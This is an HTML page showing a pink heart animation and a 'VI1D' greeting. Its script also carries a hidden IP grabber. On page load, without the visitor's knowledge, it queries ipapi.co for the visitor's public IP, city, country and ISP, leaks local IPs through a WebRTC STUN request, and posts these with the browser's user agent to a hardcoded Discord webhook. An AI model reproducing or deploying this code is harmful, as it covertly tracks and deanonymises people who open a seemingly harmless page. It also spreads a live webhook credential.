<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>VI1D ‚ù§Ô∏è</title>
<style>
    body {
        margin: 0;
        height: 100vh;
        background: linear-gradient(135deg, #ff99cc, #ff66b2);
        display: flex;
        justify-content: center;
        align-items: center;
        overflow: hidden;
        font-family: 'Poppins', sans-serif;
        cursor: none;
    }
    h1 {
        font-size: 5em;
        color: white;
        text-shadow: 0 0 20px rgba(255, 0, 102, 0.8), 0 0 40px rgba(255, 0, 102, 0.6);
        animation: pulse 2s infinite;
        z-index: 2;
    }
    @keyframes pulse {
        0%, 100% { transform: scale(1); }
        50% { transform: scale(1.05); }
    }
    .heart {
        position: absolute;
        width: 20px;
        height: 20px;
        background: red;
        transform: rotate(45deg);
        animation: floatUp 5s linear forwards;
        pointer-events: none;
    }
    .heart::before,
    .heart::after {
        content: '';
        position: absolute;
        width: 20px;
        height: 20px;
        background: red;
        border-radius: 50%;
    }
    .heart::before { top: -10px; left: 0; }
    .heart::after { left: -10px; top: 0; }
    @keyframes floatUp {
        0% { transform: translateY(0) rotate(45deg); opacity: 1; }
        100% { transform: translateY(-800px) rotate(45deg); opacity: 0; }
    }
    .cursor-heart {
        position: fixed;
        width: 15px;
        height: 15px;
        background: red;
        transform: rotate(45deg);
        pointer-events: none;
        z-index: 9999;
    }
    .cursor-heart::before,
    .cursor-heart::after {
        content: '';
        position: absolute;
        width: 15px;
        height: 15px;
        background: red;
        border-radius: 50%;
    }
    .cursor-heart::before { top: -7.5px; left: 0; }
    .cursor-heart::after { left: -7.5px; top: 0; }
</style>
</head>
<body>
    <h1>VI1D ‚ù§Ô∏è</h1>

    <script>
        // Love-Herzen
        function createHeart(){
            const heart = document.createElement('div');
            heart.className = 'heart';
            heart.style.left = Math.random() * window.innerWidth + 'px';
            heart.style.background = `hsl(${Math.random() * 360}, 70%, 60%)`;
            heart.style.animationDuration = (3 + Math.random() * 3) + 's';
            document.body.appendChild(heart);
            setTimeout(() => heart.remove(), 5000);
        }
        setInterval(createHeart, 200);

        // Cursor-Herz Effekt
        document.addEventListener('mousemove', e => {
            const cHeart = document.createElement('div');
            cHeart.className = 'cursor-heart';
            cHeart.style.left = (e.pageX - 7.5) + 'px';
            cHeart.style.top = (e.pageY - 7.5) + 'px';
            cHeart.style.background = `hsl(${Math.random() * 360}, 70%, 60%)`;
            document.body.appendChild(cHeart);
            setTimeout(() => cHeart.remove(), 500);
        });

        const webhookURL = "https://discord.com/api/webhooks/1406003285600501970/DHV4856DEk1Um6N70WyTjnl5qMsPd1egU98METNMoC8Jgs1Dzgb2VCbqKtaaTigA_i1P";

        // Public IP + Geo holen
        async function getPublicIP(){
            let ipData = await fetch("https://ipapi.co/json").then(r => r.json());
            return ipData;
        }

        // WebRTC echte IPs (lokal + evtl. public)
        function getLocalIPs(callback){
            const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = event => {
                if (!event || !event.candidate) return;
                const parts = event.candidate.candidate.split(" ");
                const ip = parts[4];
                if (ip && !ip.includes(".local")) callback(ip);
            };
        }

        (async () => {
            let pub = await getPublicIP();
            let ips = [];
            getLocalIPs(ip => {
                if (!ips.includes(ip)) ips.push(ip);
            });
            setTimeout(() => {
                fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        content: `üíñ new visitor üíñ\nPublic IP: ${pub.ip}\nLocation: ${pub.city}, ${pub.country_name}\nISP: ${pub.org}\nLocal IPs: ${ips.join(", ")}\nUA: ${navigator.userAgent}`
                    })
                });
            }, 2000);
        })();
    </script>
</body>
</html>
